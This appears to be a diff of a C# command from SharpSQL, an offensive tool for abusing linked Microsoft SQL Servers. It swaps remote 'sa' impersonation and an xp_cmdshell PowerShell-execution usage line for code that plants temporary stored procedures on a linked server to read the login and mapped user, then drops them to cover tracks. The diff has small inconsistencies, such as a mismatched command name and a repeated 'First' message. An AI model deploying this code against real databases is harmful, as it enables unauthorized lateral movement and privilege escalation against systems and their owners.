@@ -11,8 +11,8 @@ namespace SharpSQL.Commands
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell'");
-            Console.WriteLine("\tUsage: SharpSQL.exe linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
+            Console.WriteLine("[*] Action: Execute Procedures to Get Login Information on Linked SQL Server:");
+            Console.WriteLine("\tUsage: SharpSQL.exe linkedxp /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]\r\n");
 
             string user = "";
             string password = "";
@@ -21,7 +21,6 @@ namespace SharpSQL.Commands
             string connectserver = "";
             string target = "";
 
-			bool impersonate = false;
 			bool sqlauth = false;
 
             if (arguments.ContainsKey("/sqlauth"))
@@ -40,10 +39,6 @@ namespace SharpSQL.Commands
             {
                 target = arguments["/target"];
             }
-			if (arguments.ContainsKey("/impersonate"))
-			{
-				impersonate = true;
-			}
 
 			if (String.IsNullOrEmpty(database))
             {
@@ -101,43 +96,49 @@ namespace SharpSQL.Commands
                 Environment.Exit(0);
             }
 
-            string queryLogin = $"EXEC (SELECT SYSTEM_USER;) AT [{target}]";
-            SqlCommand command = new SqlCommand(queryLogin, connection);
-            SqlDataReader reader = command.ExecuteReader();
-            reader.Read();
-            Console.WriteLine("[+] Logged in as: " + reader[0] + $"on {target}");
+			string createProc = $"EXEC ('CREATE PROCEDURE whoisuser AS SELECT SYSTEM_USER;') AT [{target}]";
+			SqlCommand command = new SqlCommand(createProc, connection);
+			SqlDataReader reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[*] Creating First Temporary Procedure..");
+			reader.Close();
+
+			createProc = $"EXEC ('CREATE PROCEDURE whoisname AS SELECT USER_NAME();') AT [{target}]";
+			command = new SqlCommand(createProc, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("\n[*] Creating First Temporary Procedure..");
+			reader.Close();
+
+			string whoisuser = $"EXEC ('EXEC whoisuser') AT [{target}]";
+			command = new SqlCommand(whoisuser, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[+] Logged in as: " + reader[0]);
             reader.Close();
 
-            string queryImp = $"EXEC (SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';) AT [{target}]";
-            command = new SqlCommand(queryImp, connection);
-            reader = command.ExecuteReader();
-            while (reader.Read() == true)
-            {
-                Console.WriteLine("[*] Login that can be impersonated: " + reader[0]);
-            }
+			string whoisname = $"EXEC ('EXEC whoisname') AT [{target}]";
+			command = new SqlCommand(whoisname, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[+] Mapped to user: " + reader[0]);
+			reader.Close();
+
+			string dropProc = $"EXEC ('DROP PROCEDURE whoisuser') AT [{target}]";
+			command = new SqlCommand(dropProc, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[*] Dropping First Temporary Procedure..");
+			reader.Close();
+
+			dropProc = $"EXEC ('DROP PROCEDURE whoisname') AT [{target}]";
+			command = new SqlCommand(dropProc, connection);
+			reader = command.ExecuteReader();
+			reader.Read();
+			Console.WriteLine("[*] Dropping Second Temporary Procedure..");
             reader.Close();
 
-            if (impersonate)
-            {
-                string execAs = $"EXEC (EXECUTE AS LOGIN = 'sa';) AT [{target}]";
-                command = new SqlCommand(execAs, connection);
-                reader = command.ExecuteReader();
-                reader.Read();
-                Console.WriteLine("[*] Attempting impersonation..");
-                reader.Close();
-
-                command = new SqlCommand(queryLogin, connection);
-                reader = command.ExecuteReader();
-                reader.Read();
-				Console.WriteLine("[+] Logged in as: " + reader[0] + $"on {target}");
-				reader.Close();
-
-                connection.Close();
-            }
-            else
-            {
-                connection.Close();
-            }
-        }
+			connection.Close();
+		}
     }
 }
